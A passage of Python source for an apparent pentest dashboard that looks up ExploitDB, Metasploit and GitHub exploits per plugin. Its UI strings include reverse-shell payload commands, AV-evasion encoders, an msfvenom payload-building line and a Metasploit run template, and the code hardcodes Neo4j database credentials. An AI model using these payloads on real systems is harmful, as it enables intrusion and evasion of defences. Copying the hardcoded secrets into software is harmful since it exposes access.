}

_TACTIC_COLORS = {
    "Initial Access":       "#e84040",
    "Execution":            "#f07b29",
    "Persistence":          "#f5c842",
    "Privilege Escalation": "#a855f7",
    "Defense Evasion":      "#3b82f6",
    "Credential Access":    "#06b6d4",
    "Discovery":            "#10b981",
    "Lateral Movement":     "#f59e0b",
    "Collection":           "#8b5cf6",
    "Exfiltration":         "#ef4444",
    "Command and Control":  "#ec4899",
    "Impact":               "#dc2626",
    "Reconnaissance":       "#6366f1",
}

def _mitre_for_plugin(plugin):
    """Return list of (tactic, tid, name, procedure) matching plugin keywords."""
    text = (plugin.get("name","") + " " + plugin.get("description","") + " " +
            " ".join(plugin.get("features",[]))).lower()
    results = []
    seen    = set()
    for kw, entries in _MITRE_MAP.items():
        if kw in text:
            for tactic, tid, tname, proc in entries:
                if tid not in seen:
                    seen.add(tid)
                    results.append((tactic, tid, tname, proc))
    # Always include at least generic discovery + execution
    for fallback in [("Discovery","T1082","System Information Discovery","Gather system info to plan next steps."),
                     ("Execution","T1059","Command and Scripting Interpreter","Use command-line interfaces to execute commands.")]:
        if fallback[1] not in seen:
            results.append(fallback)
    return results[:6]


def _run_searchsploit(query):
    """Run searchsploit --json <query> and return list of result dicts."""
    try:
        out = subprocess.run(
            ["searchsploit", "--json", query],
            capture_output=True, text=True, timeout=10
        )
        if out.returncode != 0 or not out.stdout.strip():
            return []
        data = _json.loads(out.stdout)
        return data.get("RESULTS_EXPLOIT", []) + data.get("RESULTS_SHELLCODE", [])
    except Exception:
        return []


# ── Local MSF module cache ───────────────────────────────────────────────────
_MSF_CACHE_PATH = "/opt/vuln_intel/app/assets/msf_module_cache.json"
_MSF_CACHE_DATA = None   # loaded once on first call

def _load_msf_cache():
    global _MSF_CACHE_DATA
    if _MSF_CACHE_DATA is None:
        try:
            import json as _jj
            with open(_MSF_CACHE_PATH) as _f:
                _MSF_CACHE_DATA = _jj.load(_f)
        except Exception:
            _MSF_CACHE_DATA = []
    return _MSF_CACHE_DATA


# Per-plugin MSF config: types to include + path keywords + excludes
# types: list of MSF module prefix types ("exploits", "auxiliary", "post", "payloads")
# keywords: all must be in module path OR at least one in name/desc
# exclude:  skip any module whose path contains these
_PLUGIN_MSF_CONFIG = {
    # ── Risk Intelligence ────────────────────────────────────────────────────
    "aegis": {
        "types": ["exploits", "auxiliary"],
        "keywords": ["privilege", "escalation", "cve", "lpe", "elevation"],
        "exclude": [],
    },
    "exploitiq": {
        "types": ["exploits"],
        "keywords": ["exploit", "remote", "execution", "rce", "code_exec"],
        "exclude": ["dos", "fuzzer"],
    },
    "threatintel": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["scanner", "recon", "gather", "enum"],
        "exclude": [],
    },

    # ── Attack Simulation ────────────────────────────────────────────────────
    "redteam": {
        "types": ["exploits", "post"],
        "keywords": ["lateral", "psexec", "smb", "wmi", "shell", "backdoor"],
        "exclude": [],
    },
    "c2simulator": {
        "types": ["payload", "multi", "exploits"],
        "keywords": ["meterpreter", "reverse", "shell", "handler", "bind"],
        "exclude": [],
    },
    "ransomguard": {
        "types": ["exploits", "post"],
        "keywords": ["ransomware", "encrypt", "smb", "eternalblue", "wannacry", "ms17"],
        "exclude": [],
    },
    "phishcraft": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["phish", "email", "smtp", "macro", "office", "doc"],
        "exclude": [],
    },

    # ── Infrastructure Security ───────────────────────────────────────────
    "lateralmove": {
        "types": ["exploits", "post"],
        "keywords": ["smb", "psexec", "wmi", "pass_the_hash", "lateral", "pth"],
        "exclude": [],
    },
    "adscout": {
        "types": ["auxiliary", "exploits", "post"],
        "keywords": ["ldap", "kerberos", "active_directory", "domain", "kerberoast",
                     "dcsync", "ad", "smb", "ntlm", "asrep"],
        "exclude": [],
    },
    "shadowmap": {
        "types": ["auxiliary"],
        "keywords": ["scanner", "discovery", "sweep", "arp", "ping", "enum"],
        "exclude": [],
    },
    "networkpath": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["routing", "snmp", "icmp", "traceroute", "bgp", "ospf"],
        "exclude": [],
    },

    # ── Cloud Security ───────────────────────────────────────────────────────
    "cloudguard": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["aws", "azure", "cloud", "s3", "bucket", "iam", "metadata"],
        "exclude": [],
    },
    "cloudescalator": {
        "types": ["exploits", "post"],
        "keywords": ["iam", "privilege", "escalation", "cloud", "role", "assume"],
        "exclude": [],
    },
    "containersentinel": {
        "types": ["exploits", "auxiliary"],
        "keywords": ["docker", "container", "runc", "cve_2019_5736", "namespace"],
        "exclude": [],
    },
    "kubehunter": {
        "types": ["exploits", "auxiliary"],
        "keywords": ["kubernetes", "k8s", "kube", "pod", "etcd", "apiserver"],
        "exclude": [],
    },

    # ── Web & API Security ──────────────────────────────────────────────────
    "apiguardian": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["http", "api", "rest", "oauth", "jwt", "token", "endpoint"],
        "exclude": ["vnc", "smb", "ftp"],
    },
    "graphshield": {
        "types": ["exploits", "auxiliary"],
        "keywords": ["graphql", "injection", "sql", "nosql", "query"],
        "exclude": [],
    },
    "authprobe": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["auth", "login", "brute", "session", "credential", "bypass"],
        "exclude": [],
    },
    "apiabuseguard": {
        "types": ["auxiliary"],
        "keywords": ["dos", "flood", "rate", "brute", "http", "scanner"],
        "exclude": [],
    },
    "zaproxy": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["xss", "sqli", "lfi", "rfi", "web", "http", "injection"],
        "exclude": [],
    },
    "webcrawler": {
        "types": ["auxiliary"],
        "keywords": ["crawler", "spider", "http", "web", "dir", "brute"],
        "exclude": [],
    },

    # ── Vulnerability Intelligence ───────────────────────────────────────────
    "kevwatch": {
        "types": ["exploits"],
        "keywords": ["cve", "actively_exploited", "public", "remote", "rce"],
        "exclude": [],
    },
    "cveradar": {
        "types": ["exploits", "auxiliary"],
        "keywords": ["cve", "disclosure", "scanner", "remote"],
        "exclude": [],
    },

    # ── Asset Intelligence ───────────────────────────────────────────────────
    "assetmap": {
        "types": ["auxiliary"],
        "keywords": ["scanner", "portscan", "sweep", "arp", "discovery", "enum"],
        "exclude": [],
    },
    "surfacescan": {
        "types": ["auxiliary"],
        "keywords": ["scanner", "port", "service", "banner", "tcp", "udp", "nmap"],
        "exclude": [],
    },
    "reconeye": {
        "types": ["auxiliary"],
        "keywords": ["recon", "gather", "dns", "whois", "enum", "subdomain"],
        "exclude": [],
    },

    # ── Remediation ──────────────────────────────────────────────────────────
    "patchguard": {
        "types": ["auxiliary", "exploits"],
        "keywords": ["patch", "missing", "unpatched", "windows_update", "hotfix",
                     "ms14", "ms17", "ms08", "eternalblue"],
        "exclude": [],
    },
}

# Fallback category config for plugins not in _PLUGIN_MSF_CONFIG
_CATEGORY_MSF_FALLBACK = {
    "Risk Intelligence":         {"types": ["exploits"], "keywords": ["privilege", "rce", "exploit"]},
    "Attack Simulation":         {"types": ["exploits", "post"], "keywords": ["shell", "backdoor", "lateral"]},
    "Infrastructure Security":   {"types": ["exploits", "auxiliary"], "keywords": ["smb", "ssh", "ldap"]},
    "Cloud Security":            {"types": ["auxiliary", "exploits"], "keywords": ["cloud", "aws", "iam"]},
    "Web & API Security":        {"types": ["auxiliary", "exploits"], "keywords": ["http", "sql", "xss"]},
    "Vulnerability Intelligence":{"types": ["exploits"], "keywords": ["cve", "remote", "exploit"]},
    "Asset Intelligence":        {"types": ["auxiliary"], "keywords": ["scanner", "recon", "enum"]},
    "Remediation":               {"types": ["exploits", "auxiliary"], "keywords": ["patch", "ms17", "update"]},
}


def _run_msf_search(query, plugin=None, live_cves=None):
    """Search local MSF cache using per-plugin type + keyword config for precision."""
    cache = _load_msf_cache()
    if not cache:
        return []

    pid = (plugin.get("name", "").lower().replace(" ", "") if plugin else "") or query.lower()
    cat = plugin.get("category", "") if plugin else ""

    # Resolve config: per-plugin → category fallback → bare keyword
    cfg = (_PLUGIN_MSF_CONFIG.get(pid)
           or _PLUGIN_MSF_CONFIG.get(query.lower())
           or _CATEGORY_MSF_FALLBACK.get(cat)
           or {"types": ["exploits", "auxiliary"], "keywords": [query.lower()]})

    allowed_types = set(cfg.get("types", []))
    required_kws  = [kw.lower() for kw in cfg.get("keywords", [])]
    exclude_kws   = [kw.lower() for kw in cfg.get("exclude", [])]

    # Also add live CVE IDs as bonus score keywords
    cve_terms = [c.lower() for c in (live_cves or [])[:3] if c]

    rank_order = {"excellent": 5, "great": 4, "good": 3, "normal": 2, "average": 1, "low": 0}
    scored = []
    for mod in cache:
        mod_path = mod.get("path", "").lower()
        mod_type = mod.get("type", "").lower()  # exploits / auxiliary / post / payloads / etc.

        # Type filter — module must start with one of the allowed types
        if allowed_types and not any(mod_path.startswith(t) for t in allowed_types):
            continue

        # Exclusion filter
        if any(ex in mod_path for ex in exclude_kws):
            continue

        mod_text = mod_path + " " + mod.get("name", "").lower() + " " + mod.get("desc", "").lower()

        # At least ONE required keyword must match
        kw_hits = sum(1 for kw in required_kws if kw in mod_text)
        if kw_hits == 0:
            continue

        # Bonus for CVE matches
        cve_hits = sum(1 for c in cve_terms if c in mod_text)

        scored.append((kw_hits + cve_hits, rank_order.get(mod.get("rank", ""), 0), mod))

    scored.sort(key=lambda x: (x[0], x[1]), reverse=True)

    results = []
    seen = set()
    for _, _, mod in scored:
        p = mod["path"]
        if p in seen:
            continue
        seen.add(p)
        desc_part = mod.get("name", "")
        if mod.get("desc"):
            desc_part += " — " + mod["desc"][:60]
        results.append({
            "#":    str(len(results) + 1),
            "Name": p,
            "Date": "",
            "Rank": mod.get("rank", "normal"),
            "Check":mod.get("type", ""),
            "Desc": desc_part,
        })
        if len(results) >= 15:
            break

    return results


def _github_exploits(cves):
    """Search GitHub for exploit repos related to given CVEs."""
    import requests as _req
    results = []
    for cve in (cves or [])[:3]:
        if not cve or not str(cve).startswith("CVE-"):
            continue
        try:
            resp = _req.get(
                "https://api.github.com/search/repositories",
                params={"q": f"{cve} exploit", "sort": "stars", "per_page": 4},
                headers={"Accept": "application/vnd.github.v3+json"},
                timeout=6,
            )
            if resp.status_code == 200:
                for item in resp.json().get("items", []):
                    results.append({
                        "cve":      cve,
                        "repo":     item["full_name"],
                        "url":      item["html_url"],
                        "desc":     (item.get("description") or "")[:80],
                        "stars":    item.get("stargazers_count", 0),
                        "lang":     item.get("language") or "—",
                        "updated":  (item.get("updated_at") or "")[:10],
                    })
        except Exception:
            pass
    return results[:8]


# ── Shared dark-card helper ───────────────────────────────────────────────────
def _intel_card(title_icon, title, color, *children, **kwargs):
    return html.Div([
        html.Div([
            html.Span(title_icon, style={"marginRight": "8px"}),
            html.Span(title, style={"color": color, "fontWeight": "700", "fontSize": "13px"}),
        ], style={"borderBottom": f"1px solid {color}33", "paddingBottom": "8px", "marginBottom": "14px"}),
        *children,
    ], style={"background": "#0d0d16", "border": f"1px solid {color}33",
               "borderRadius": "10px", "padding": "16px 18px", "marginBottom": "14px",
               **kwargs.get("style", {})})


# ==============================================================================
# PLUGIN DETAIL VIEW BUILDER
# ==============================================================================
def _build_plugin_detail(pid):
    """Build the detail view for a single plugin."""
    plugin = PLUGIN_REGISTRY[pid]

    # Query Neo4j for live data
    data_rows  = []
    data_error = None
    live_cves  = []   # declared early — populated below after data_rows is filled
    try:
        from neo4j import GraphDatabase
        driver = GraphDatabase.driver("bolt://localhost:7687", auth=("neo4j", "Adomaa12@"))
        with driver.session() as session:
            result = session.run(plugin["neo4j_query"])
            data_rows = result.data()
        driver.close()
    except Exception as e:
        data_error = str(e)

    # ── Universal: Query affected hosts + ports for this plugin ─────────────
    host_rows = []
    try:
        from neo4j import GraphDatabase as _GD2
        _drv2 = _GD2.driver("bolt://localhost:7687", auth=("neo4j", "Adomaa12@"))
        with _drv2.session() as _s2:
            host_rows = _s2.run("""
                MATCH (f:Finding)
                WHERE f.host IS NOT NULL AND f.host <> ''
                WITH f.host AS host,
                     count(*) AS total_findings,
                     max(toFloat(coalesce(toString(f.cvss),'0'))) AS max_cvss,
                     sum(CASE WHEN toFloat(coalesce(toString(f.cvss),'0')) >= 9.0 THEN 1 ELSE 0 END) AS critical_count,
                     sum(CASE WHEN toFloat(coalesce(toString(f.cvss),'0')) >= 7.0
                               AND toFloat(coalesce(toString(f.cvss),'0')) < 9.0 THEN 1 ELSE 0 END) AS high_count,
                     [x IN collect(DISTINCT coalesce(f.cve,'')) WHERE x =~ 'CVE-\\d{4}-\\d+'][0..4] AS sample_cves,
                     collect(DISTINCT coalesce(toString(f.port),''))[0..8] AS open_ports,
                     collect(DISTINCT coalesce(f.service,''))[0..6] AS services,
                     coalesce(collect(DISTINCT f.scanner)[0], 'unknown') AS scanner
                RETURN host, total_findings, max_cvss, critical_count, high_count,
                       sample_cves, open_ports, services, scanner
                ORDER BY max_cvss DESC, total_findings DESC
                LIMIT 20
            """).data()
        _drv2.close()
    except Exception:
        host_rows = []

    # Build data table
    if data_error:
        data_display = dbc.Alert(f"⚠️ Neo4j Error: {data_error}", color="danger",
                                  style={"fontSize": "12px"})
    elif data_rows:
        cols = list(data_rows[0].keys())
        table_header = html.Thead(html.Tr([
            html.Th(c.replace("_", " ").upper(), style={
                "backgroundColor": "#1a1a2e", "color": plugin["cat_color"],
                "fontSize": "10px", "fontWeight": "bold", "padding": "8px",
                "borderBottom": f"1px solid {plugin['cat_color']}44",
            }) for c in cols
        ]))
        def _render_cell(c, val):
            """Smart cell renderer — styles CVE IDs blue, MSF refs purple."""
            v = str(val) if val is not None else "—"
            if c == "cve" or (c in ("name","vuln_name") and v.startswith("MSF:")):
                if v.startswith("CVE-"):
                    return html.Td(
                        html.A(v, href=f"https://nvd.nist.gov/vuln/detail/{v}",
                               target="_blank",
                               style={"color":"#5baef5","fontWeight":"700","fontSize":"11px","fontFamily":"monospace"}),
                        style={"padding":"6px 8px","borderBottom":"1px solid #222"})
                elif v.startswith("MSF:"):
                    mod_name = v.replace("MSF:","").replace("-"," / ").lower()
                    return html.Td(html.Div([
                        html.Span("MSF", style={"background":"#2d0d44","color":"#c084fc","border":"1px solid #a855f7",
                                                  "borderRadius":"3px","padding":"1px 5px","fontSize":"8px",
                                                  "fontWeight":"700","marginRight":"5px","fontFamily":"monospace"}),
                        html.Span(mod_name[:55], style={"color":"#8a7099","fontSize":"10px"}),
                    ], style={"display":"flex","alignItems":"center"}),
                    style={"padding":"6px 8px","borderBottom":"1px solid #222"})
            # default
            return html.Td(v[:60], style={"fontSize":"11px","padding":"6px 8px","color":"#ccc","borderBottom":"1px solid #222"})

        table_body = html.Tbody([
            html.Tr([_render_cell(c, row.get(c, "—")) for c in cols]) for row in data_rows
        ])
        data_display = dbc.Table(
            [table_header, table_body], bordered=False, hover=True, responsive=True,
            style={"backgroundColor": "#0d0d16", "marginBottom": 0},
        )
        
        # Build dynamic charts
        chart_display = _build_plugin_charts(data_rows, plugin)
        
    else:
        data_display = dbc.Alert("No matching data found in Neo4j for this plugin.",
                                  color="info", style={"fontSize": "12px"})
        chart_display = None

    # ── 1. Gather intelligence data ──────────────────────────────────────────
    mitre_entries = _mitre_for_plugin(plugin)
    plugin_kw     = plugin["name"].lower().split()[0]  # e.g. "exploitiq" → "exploitiq"
    # also search by first feature keyword
    kw2 = plugin.get("features", [""])[0].split()[-1].lower() if plugin.get("features") else ""
    # Collect CVEs from neo4j data rows (needed for msf + github searches)
    live_cves     = list({r.get("cve") for r in data_rows if r.get("cve") and str(r.get("cve","")).startswith("CVE-")})[:5]
    edb_results   = _run_searchsploit(plugin_kw) or _run_searchsploit(kw2)
    msf_results   = _run_msf_search(plugin_kw, plugin=plugin, live_cves=live_cves)
    gh_results    = _github_exploits(live_cves)

    cat_color = plugin["cat_color"]

    # ── 2. MITRE ATT&CK section ──────────────────────────────────────────────
    def _tactic_badge(tactic):
        c = _TACTIC_COLORS.get(tactic, "#4a5a78")
        return html.Span(tactic, style={"background": c+"22","color":c,"border":f"1px solid {c}44",
                          "borderRadius":"12px","padding":"2px 10px","fontSize":"9px","fontWeight":"700",
                          "marginRight":"6px","display":"inline-block"})

    mitre_rows = [
        html.Div([
            html.Div([
                html.Div([
                    _tactic_badge(tac),
                    html.Span(tid, style={"color":"#3b82f6","fontSize":"10px","fontWeight":"700",
                                          "fontFamily":"monospace","marginLeft":"8px"}),
                ], style={"display":"flex","alignItems":"center","marginBottom":"4px"}),
                html.Div(tname, style={"color":"#d0d8e8","fontSize":"12px","fontWeight":"700","marginBottom":"3px"}),
                html.Div(proc, style={"color":"#4a5a78","fontSize":"10px","lineHeight":"1.4"}),
                html.A(f"🔗 View {tid} on MITRE",
                       href=f"https://attack.mitre.org/techniques/{tid.replace('.','/')}/",
                       target="_blank",
                       style={"color":"#3b82f6","fontSize":"9px","marginTop":"4px","display":"block"}),
            ], style={"flex":"1"}),
        ], style={"background":"#111118","border":"1px solid #1e2a40","borderRadius":"8px",
                   "padding":"12px 14px","marginBottom":"8px"})
        for tac, tid, tname, proc in mitre_entries
    ]
    mitre_section = _intel_card("🎯","MITRE ATT&CK — Tactics · Techniques · Procedures","#a855f7",
        dbc.Row([dbc.Col(r, md=6) for r in mitre_rows], className="g-2"))

    # ── 3. ExploitDB section ─────────────────────────────────────────────────
    if edb_results:
        edb_table = html.Table([
            html.Thead(html.Tr([
                html.Th("EDB-ID",    style={"color":"#f07b29","fontSize":"9px","fontWeight":"700","padding":"6px 10px","borderBottom":"1px solid #1e2a40","whiteSpace":"nowrap"}),
                html.Th("Title",     style={"color":"#f07b29","fontSize":"9px","fontWeight":"700","padding":"6px 10px","borderBottom":"1px solid #1e2a40"}),
                html.Th("Type",      style={"color":"#f07b29","fontSize":"9px","fontWeight":"700","padding":"6px 10px","borderBottom":"1px solid #1e2a40","whiteSpace":"nowrap"}),
                html.Th("Platform",  style={"color":"#f07b29","fontSize":"9px","fontWeight":"700","padding":"6px 10px","borderBottom":"1px solid #1e2a40","whiteSpace":"nowrap"}),
                html.Th("Path",      style={"color":"#f07b29","fontSize":"9px","fontWeight":"700","padding":"6px 10px","borderBottom":"1px solid #1e2a40"}),
            ])),
            html.Tbody([
                html.Tr([
                    html.Td(
                        html.A(str(r.get("EDB-ID","—")),
                               href=f"https://www.exploit-db.com/exploits/{r.get('EDB-ID','')}",
                               target="_blank",
                               style={"color":"#f07b29","fontWeight":"700","fontFamily":"monospace","fontSize":"11px"}),
                        style={"padding":"6px 10px","borderBottom":"1px solid #0f1830"}),
                    html.Td(str(r.get("Title",""))[:60],   style={"padding":"6px 10px","borderBottom":"1px solid #0f1830","color":"#c0cce0","fontSize":"11px"}),
                    html.Td(str(r.get("Type",""))[:20],    style={"padding":"6px 10px","borderBottom":"1px solid #0f1830","color":"#8a9cc0","fontSize":"10px"}),
                    html.Td(str(r.get("Platform",""))[:20],style={"padding":"6px 10px","borderBottom":"1px solid #0f1830","color":"#8a9cc0","fontSize":"10px"}),
                    html.Td(
                        html.Code(str(r.get("Path",""))[:50], style={"fontSize":"9px","color":"#4a5a78","fontFamily":"monospace"}),
                        style={"padding":"6px 10px","borderBottom":"1px solid #0f1830"}),
                ]) for r in edb_results[:10]
            ]),
        ], style={"width":"100%","borderCollapse":"collapse"})
        edb_cmd_preview = html.Div([
            html.Div("QUICK COMMANDS", style={"color":"#2e3d58","fontSize":"9px","fontWeight":"800","letterSpacing":"1.5px","marginBottom":"8px","marginTop":"12px"}),
            html.Code([
                html.Span(f"searchsploit {plugin_kw}\n", style={"display":"block"}),
                html.Span(f"searchsploit -m {edb_results[0].get('EDB-ID','')}\n" if edb_results else "", style={"display":"block","color":"#f07b29"}),
                html.Span("# Then: python3 <exploit>.py <target>", style={"display":"block","color":"#2e3d58"}),
            ], style={"background":"#080c14","border":"1px solid #1e2a40","borderRadius":"6px",
                       "display":"block","padding":"10px 14px","fontSize":"11px","color":"#5baef5","fontFamily":"monospace"}),
        ])
        edb_content = html.Div([edb_table, edb_cmd_preview])
    else:
        edb_content = html.Div([
            html.Div(f'No ExploitDB results for "{plugin_kw}".',
                     style={"color":"#2e3d58","fontSize":"12px","marginBottom":"8px"}),
            html.A("🔗 Search ExploitDB manually",
                   href=f"https://www.exploit-db.com/search?q={plugin_kw}",
                   target="_blank", style={"color":"#f07b29","fontSize":"11px"}),
        ])
    edb_section = _intel_card("💥","ExploitDB — Public Exploits & PoC","#f07b29", edb_content)

    # ── 4. Metasploit section ─────────────────────────────────────────────────
    if msf_results:
        msf_table = html.Table([
            html.Thead(html.Tr([
                html.Th(h, style={"color":"#a855f7","fontSize":"9px","fontWeight":"700",
                                   "padding":"6px 10px","borderBottom":"1px solid #1e2a40"})
                for h in ["#","Module","Date","Rank","Check","Description"]
            ])),
            html.Tbody([
                html.Tr([
                    html.Td(r.get("#",""), style={"padding":"5px 10px","borderBottom":"1px solid #0f1830","color":"#2e3d58","fontSize":"10px","fontFamily":"monospace"}),
                    html.Td(
                        html.Div([
                            html.Code(r.get("Name",""), style={"fontSize":"10px","color":"#c084fc","fontFamily":"monospace","display":"block"}),
                            html.Span(
                                html.A("Copy use command",
                                       href="#",
                                       id={"type":"msf-copy","module":r.get("Name","")},
                                       style={"color":"#6366f1","fontSize":"9px"}),
                            ),
                        ]),
                        style={"padding":"5px 10px","borderBottom":"1px solid #0f1830"}),
                    html.Td(r.get("Date",""), style={"padding":"5px 10px","borderBottom":"1px solid #0f1830","color":"#2e3d58","fontSize":"9px","whiteSpace":"nowrap"}),
                    html.Td(
                        html.Span(r.get("Rank",""),
                                  style={"color":"#e84040" if r.get("Rank","")=="excellent" else "#f07b29","fontSize":"9px","fontWeight":"700"}),
                        style={"padding":"5px 10px","borderBottom":"1px solid #0f1830"}),
                    html.Td(r.get("Check",""), style={"padding":"5px 10px","borderBottom":"1px solid #0f1830","color":"#8a9cc0","fontSize":"9px"}),
                    html.Td(r.get("Desc","")[:60], style={"padding":"5px 10px","borderBottom":"1px solid #0f1830","color":"#c0cce0","fontSize":"11px"}),
                ]) for r in msf_results
            ]),
        ], style={"width":"100%","borderCollapse":"collapse","marginBottom":"12px"})
        # Payload / encoder quick-ref
        msf_tips = html.Div([
            html.Div("COMMON PAYLOADS & ENCODERS", style={"color":"#2e3d58","fontSize":"9px","fontWeight":"800","letterSpacing":"1.5px","marginBottom":"8px"}),
            html.Code([
                html.Span("# Set payload (choose one):\n", style={"display":"block","color":"#4a5a78"}),
                html.Span("set PAYLOAD windows/meterpreter/reverse_tcp\n", style={"display":"block","color":"#c084fc"}),
                html.Span("set PAYLOAD linux/x86/meterpreter/reverse_tcp\n", style={"display":"block","color":"#c084fc"}),
                html.Span("set PAYLOAD cmd/unix/reverse_bash\n\n", style={"display":"block","color":"#c084fc"}),
                html.Span("# Encoders (for AV evasion):\n", style={"display":"block","color":"#4a5a78"}),
                html.Span("set ENCODER x86/shikata_ga_nai   # polymorphic\n", style={"display":"block","color":"#a855f7"}),
                html.Span("set ENCODER x64/xor_dynamic       # XOR x64\n\n", style={"display":"block","color":"#a855f7"}),
                html.Span("# Generate standalone payload:\n", style={"display":"block","color":"#4a5a78"}),
                html.Span(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe", style={"display":"block","color":"#5baef5"}),
            ], style={"background":"#080c14","border":"1px solid #1e2a40","borderRadius":"6px",
                       "display":"block","padding":"10px 14px","fontSize":"10px","fontFamily":"monospace","lineHeight":"1.8"}),
        ])
        msf_content = html.Div([msf_table, msf_tips])
    else:
        msf_content = html.Div([
            html.Div(f'No Metasploit modules found for "{plugin_kw}" — try manual search.',
                     style={"color":"#2e3d58","fontSize":"12px","marginBottom":"8px"}),
            html.Code(f"msfconsole -x \"search {plugin_kw}; exit\"",
                      style={"background":"#080c14","border":"1px solid #1e2a40","borderRadius":"6px",
                              "display":"block","padding":"8px 12px","fontSize":"10px","color":"#c084fc","fontFamily":"monospace"}),
        ])
    msf_section = _intel_card("🟣","Metasploit — Modules · Payloads · Encoders","#a855f7", msf_content)

    # ── 5. GitHub Exploits section ────────────────────────────────────────────
    if gh_results:
        gh_cards = dbc.Row([
            dbc.Col(html.Div([
                html.Div([
                    html.Span(g["cve"], style={"background":"#e84040","color":"#fff","borderRadius":"4px",
                                                "fontSize":"9px","fontWeight":"700","padding":"2px 6px","marginRight":"8px"}),
                    html.A(g["repo"], href=g["url"], target="_blank",
                           style={"color":"#5baef5","fontWeight":"700","fontSize":"11px"}),
                ], style={"marginBottom":"4px"}),
                html.Div(g["desc"] or "No description", style={"color":"#4a5a78","fontSize":"10px","marginBottom":"6px"}),
                html.Div([
                    html.Span(f"⭐ {g['stars']}", style={"color":"#f5c842","fontSize":"10px","marginRight":"10px"}),
                    html.Span(f"🔤 {g['lang']}",  style={"color":"#8a9cc0","fontSize":"10px","marginRight":"10px"}),
                    html.Span(f"📅 {g['updated']}",style={"color":"#2e3d58","fontSize":"9px"}),
                ]),
            ], style={"background":"#111118","border":"1px solid #1e2a40","borderRadius":"8px","padding":"10px 12px"}),
            md=6, className="mb-2")
            for g in gh_results
        ], className="g-2")
    else:
        gh_cards = html.Div([
            html.Div("No GitHub exploit repositories found for the current CVEs." if live_cves
                     else "Refresh plugin data first to get CVEs — GitHub search uses live CVE IDs.",
                     style={"color":"#2e3d58","fontSize":"12px","marginBottom":"8px"}),
            *[html.A(f"🔗 GitHub search: {c}",
                      href=f"https://github.com/search?q={c}+exploit&type=repositories",
                      target="_blank",
                      style={"color":"#5baef5","fontSize":"11px","display":"block","marginBottom":"4px"})
              for c in live_cves[:3]],
        ])
    gh_section  = _intel_card("🐙","GitHub — Public Exploit Repositories","#5baef5", gh_cards)

    # ── 6. PoC Workspace ─────────────────────────────────────────────────────
    # Pre-fill template
    poc_template_lines = [
        f"# ==== Proof of Concept: {plugin['name']} ====",
        f"# Plugin: {pid}",
        f"# Category: {plugin['category']}",
        f"# Date: {__import__('datetime').datetime.now().strftime('%Y-%m-%d')}",
        "",
        "# --- Target ---",
        "TARGET_IP = ''",
        "TARGET_PORT = ''",
        "",
    ]
    if live_cves:
        poc_template_lines += ["# --- CVEs in scope ---"] + [f"# {c}" for c in live_cves] + [""]
    if edb_results:
        poc_template_lines += [
            "# --- ExploitDB ---",
            f"searchsploit {plugin_kw}",
            f"searchsploit -m {edb_results[0].get('EDB-ID','')}",
            "python3 <exploit>.py $TARGET_IP",
            "",
        ]
    if msf_results:
        mod = msf_results[0].get("Name","")
        poc_template_lines += [
            "# --- Metasploit ---",
            "msfconsole",
            f"use {mod}",
            "set RHOSTS $TARGET_IP",
            "set LHOST <your_ip>",
            "set LPORT 4444",
            "set PAYLOAD windows/meterpreter/reverse_tcp",
            "run",
            "",
        ]
    poc_template_lines += [
        "# --- Notes ---",
        "# Steps taken:",
        "# 1. ",
        "# 2. ",
        "# 3. ",
        "",
        "# --- Evidence / Output ---",
        "",
    ]
    poc_default_text = "\n".join(poc_template_lines)

    poc_section = _intel_card("🧪","Proof of Concept Workspace","#29b87a",
        html.Div([
            html.Div("Edit, annotate, and document your PoC steps below.",
                     style={"color":"#2e3d58","fontSize":"10px","marginBottom":"10px"}),
            dcc.Textarea(
                id={"type":"plugin-poc-editor","index":pid},
                value=poc_default_text,
                style={"width":"100%","height":"280px","fontFamily":"monospace","fontSize":"11px",
                        "background":"#080c14","color":"#29b87a","border":"1px solid #1e2a40",
                        "borderRadius":"6px","padding":"10px 14px","outline":"none","resize":"vertical",
                        "lineHeight":"1.6"},
            ),
            html.Div([
                dbc.Button("🗑 Clear", id={"type":"plugin-poc-clear","index":pid},
                           n_clicks=0, size="sm",
                           style={"background":"transparent","border":"1px solid #2e3d58","color":"#4a5a78",
                                   "fontSize":"10px","marginTop":"8px","marginRight":"8px"}),
                dbc.Button("📋 Copy",  id={"type":"plugin-poc-copy","index":pid},
                           n_clicks=0, size="sm",
                           style={"background":"transparent","border":"1px solid #29b87a","color":"#29b87a",
                                   "fontSize":"10px","marginTop":"8px"}),
            ]),
        ])
    )

    # ── 7. Affected Hosts + Ports section ───────────────────────────────────
    def _sev_color(cvss): return ("#e84040" if cvss>=9 else "#f07b29" if cvss>=7 else "#f5c842" if cvss>=4 else "#29b87a" if cvss>0 else "#4a5a78")

    if host_rows:
        total_crit  = sum(r.get("critical_count",0) for r in host_rows)
        total_all   = sum(r.get("total_findings",0) for r in host_rows)
        host_content = html.Div([
            # Summary chips
            html.Div([
                html.Div([
                    html.Span(str(len(host_rows)), style={"color":"#5baef5","fontSize":"26px","fontWeight":"900","fontFamily":"monospace","lineHeight":"1"}),
                    html.Div("Affected Hosts", style={"color":"#2e3d58","fontSize":"9px","fontWeight":"700","textTransform":"uppercase","letterSpacing":"1px","marginTop":"2px"}),
                ], style={"marginRight":"20px"}),
                html.Div([
                    html.Span(str(total_crit), style={"color":"#e84040","fontSize":"26px","fontWeight":"900","fontFamily":"monospace","lineHeight":"1"}),
                    html.Div("Critical Findings", style={"color":"#2e3d58","fontSize":"9px","fontWeight":"700","textTransform":"uppercase","letterSpacing":"1px","marginTop":"2px"}),
                ], style={"marginRight":"20px"}),
                html.Div([
                    html.Span(str(total_all), style={"color":"#f07b29","fontSize":"26px","fontWeight":"900","fontFamily":"monospace","lineHeight":"1"}),
                    html.Div("Total Findings", style={"color":"#2e3d58","fontSize":"9px","fontWeight":"700","textTransform":"uppercase","letterSpacing":"1px","marginTop":"2px"}),
                ]),
            ], style={"display":"flex","marginBottom":"14px","flexWrap":"wrap","gap":"8px"}),

            # Host cards
            *[html.Div([
                # Row 1: hostname + CVSS badge + scanner
                html.Div([
                    html.Span("🖥", style={"marginRight":"8px","fontSize":"16px"}),
                    html.Span(r.get("host","?"),
